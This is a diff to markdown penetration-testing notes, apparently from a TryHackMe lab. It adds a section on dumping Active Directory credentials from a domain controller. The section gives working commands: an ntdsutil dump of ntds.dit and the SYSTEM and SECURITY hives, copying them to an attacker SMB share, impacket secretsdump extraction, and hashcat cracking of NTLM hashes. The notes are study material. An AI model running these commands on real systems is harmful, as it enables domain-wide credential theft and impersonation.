@@ -254,7 +254,7 @@ The command returns a 0x00000005 error code message (Access Denied). Lucky for u
 !+
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (11).png" alt=""><figcaption></figcaption></figure>
 
 Note: If this fails with an `isFileExist` error, exit mimikatz, navigate to `C:\Tools\Mimikatz\` and run the command again.\
 
@@ -452,3 +452,89 @@ sekurlsa::credman
 <figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 ## Domain Controller
+
+This task discusses the required steps to dump Domain Controller Hashes locally and remotely.
+
+### NTDS Domain Controller
+
+New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.DTS data consists of three tables as follows:
+
+* Schema table: it contains types of objects and their relationships.
+* Link table: it contains the object's attributes and their values.
+* Data type: It contains users and groups.
+
+NTDS is located in`C:\Windows\NTDS` by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. However, there are various ways to gain access to it. This task will discuss how to get a copy of the NTDS file using the ntdsutil and Diskshadow tool and finally how to dump the file's content. It is important to note that decrypting the NTDS file requires a system Boot Key to attempt to decrypt LSA Isolated credentials, which is stored in the `SECURITY` file system. Therefore, we must also dump the security file containing all required files to decrypt.&#x20;
+
+### Ntdsutil 
+
+Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios such as&#x20;
+
+* Restore deleted objects in Active Directory.
+* Perform maintenance for the AD database.
+* Active Directory snapshot management.
+* Set Directory Services Restore Mode (DSRM) administrator passwords.
+
+For more information about Ntdsutil, you may visit the Microsoft documentation [page](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343\(v=ws.11\)).
+
+### Local Dumping (No Credentials)
+
+This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller.&#x20;
+
+To successfully dump the content of the NTDS file we need the following files:
+
+* C:\Windows\NTDS\ntds.dit
+* C:\Windows\System32\config\SYSTEM
+* C:\Windows\System32\config\SECURITY
+
+The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the `C:\temp` directory.
+
+**Victim(cmd)**
+
+```
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Now, if we check the `c:\temp` directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.
+
+<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Kali**
+
+```
+mkdir public
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 smb public/
+```
+
+**Victim(cmd)**
+
+```
+cd C:\temp\
+net use \\$KALI\smb
+copy "C:\temp\Active Directory\ntds.dit" \\$KALI\smb \\$KALI\smb
+copy "C:\temp\registry\SECURITY" \\$KALI\smb
+copy "C:\temp\registry\SYSTEM" \\$KALI\smb
+```
+
+**Kali**
+
+```
+cd public
+python3.9 /opt/impacket/examples/secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such `hashcat`. We can use the hashcat `-m 1000` mode to crack the Windows NTLM hashes as follows:
+
+**Kali**
+
+```
+hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
